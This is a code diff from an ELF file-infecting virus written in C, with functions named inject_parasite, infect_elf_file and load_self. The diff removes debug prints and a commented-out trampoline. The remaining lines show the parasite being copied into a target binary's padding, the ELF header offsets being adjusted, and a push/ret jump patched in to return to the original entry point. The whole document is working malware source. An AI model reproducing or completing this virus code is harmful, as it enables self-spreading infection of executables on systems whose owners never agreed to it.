@@ -267,11 +267,8 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
         void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
 	int end_code_size = (int)((char *)f2 - (char *)f1);
  	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
-       // long o_entry_offset = end_code_addr - orig_entry_point;
         uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3};
 	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
-	//_printf("orig_entry point: %x orig offset: %x\n", orig_entry_point, o_entry_offset);
-	_printf("orig: %x\n", orig_entry_point);
 	/*
 	 * Write parasite up until end_code()
 	 */
@@ -375,19 +372,6 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	ehdr->e_shoff += paddingSize;
 	ehdr->e_phoff += paddingSize;
 	
-	/*
-	 * !!!
-	 * If this is not the original Virus executable then we must patch
-	 * in a trampoline:
-	 * Overwrite end_code with a trampoline 'jmp orig_entry_point'
-	 */
-/*
-	uint8_t *patch = (uint8_t *)((long)get_rip() - ((char *)&get_rip_label - (char *)&end_code));
-	ElfW(Addr) end_code_addr = (ElfW(Addr))patch;
-        o_entry_offset = end_code_addr - orig_entry_point;
-        *patch = 0xe9; // jmp
-	*(uint32_t *)&patch[1] = o_entry_offset;
-*/
 	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
 	
 	return 0;
@@ -402,11 +386,8 @@ int load_self(elfbin_t *elf)
 {	
 	int i;
 	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
-	//((long) get_rip() - ((char *)&get_rip_label - (char *)&end_code));
 	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
-	//((long) get_rip() - ((char *)&get_rip_label - (char *)&dummy_marker));
 	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start);
-	//get_rip() - ((char *)&get_rip_label - (char *)&_start);
 	elf->mem = (uint8_t *)_start_addr;
 	elf->size = (char *)&end_code - (char *)&_start; 
 	elf->size += (int)((char *)f2 - (char *)f1);
